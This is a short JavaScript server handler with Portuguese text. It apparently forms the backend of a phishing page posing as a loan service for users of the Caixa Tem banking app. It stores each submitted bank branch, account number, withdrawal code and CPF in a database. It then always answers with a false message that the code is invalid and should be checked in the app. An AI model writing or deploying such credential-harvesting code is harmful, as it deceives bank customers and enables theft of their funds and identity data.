import conexao from '../conexao.js';

export default function handler(req, res) {
    if (req.method === 'POST') {
        const { agencia, conta, codigoSaque, cpf } = req.body;

        // Validação simples para dados de empréstimo
        if (!agencia || !conta || !codigoSaque || !cpf) {
            return res.status(400).json({ erro: 'Todos os campos são obrigatórios.' });
        }

        const query = 'INSERT INTO dados (agencia, conta, codigo_saque, cpf) VALUES (?, ?, ?, ?)';
        const values = [agencia, conta, codigoSaque, cpf];

        conexao.run(query, values, (err) => {
            if (err) {
                return res.status(500).json({ erro: 'Erro ao processar a solicitação.' });
            }

            res.status(200).json({
                status: 'sucesso',
                message: 'Código de saque inválido, verifique o código em seu aplicativo Caixa Tem!'
            });
        });
    } else {
        return res.status(405).json({ erro: 'Método não permitido.' });
    }
}
